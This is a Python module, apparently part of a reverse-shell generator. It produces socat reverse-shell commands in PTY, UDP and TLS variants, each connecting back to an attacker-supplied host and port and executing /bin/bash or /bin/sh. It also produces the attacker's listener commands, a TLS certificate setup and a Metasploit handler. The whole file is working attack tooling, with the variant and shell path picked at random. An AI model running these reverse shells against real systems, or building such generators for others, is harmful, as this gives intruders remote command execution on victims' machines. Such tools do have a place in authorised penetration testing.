import random
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler

_SHELL_PATHS = ["/bin/bash", "/bin/sh"]


class SocatGenerator(ShellGenerator):
    language = "socat"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variants = ["pty", "udp", "tls"]
        variant = random.choice(variants)
        full_pty_note = (
            "# socat pty variant already provides a full PTY — no upgrade needed.\n"
            f"# Standard upgrade for reference:\n{TTY_UPGRADE}"
        )

        if variant == "pty":
            cmd = self._pty(opts, names)
            listener = f"socat -d -d file:`tty`,raw,echo=0 TCP4-LISTEN:{opts.lport}"
            tty_note = full_pty_note
        elif variant == "udp":
            cmd = self._udp(opts, names)
            listener = f"socat -d -d file:`tty`,raw,echo=0 UDP4-LISTEN:{opts.lport}"
            tty_note = TTY_UPGRADE
        else:
            cmd = self._tls(opts, names)
            listener = (
                "# Setup (run once on attacker machine):\n"
                f"openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem "
                f"-days 7 -nodes -subj '/CN=x' 2>/dev/null\n\n"
                f"socat -d -d OPENSSL-LISTEN:{opts.lport},"
                f"cert=/tmp/cert.pem,key=/tmp/key.pem,verify=0 file:`tty`,raw,echo=0"
            )
            tty_note = full_pty_note

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=listener,
            tty_upgrade=tty_note,
            msf_compat=msf_handler("payload/cmd/unix/reverse", opts.lhost, opts.lport),
        )

    def _pty(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        shell = random.choice(_SHELL_PATHS) if names else "/bin/bash"
        return (
            f"socat TCP4-CONNECT:{opts.lhost}:{opts.lport} "
            f"EXEC:{shell},pty,stderr,setsid,sigint,sane"
        )

    def _udp(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        return (
            f"socat UDP4-CONNECT:{opts.lhost}:{opts.lport} "
            f"EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"
        )

    def _tls(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        shell = random.choice(_SHELL_PATHS) if names else "/bin/bash"
        return (
            f"socat OPENSSL:{opts.lhost}:{opts.lport},verify=0 "
            f"EXEC:{shell},pty,stderr,setsid,sigint,sane"
        )
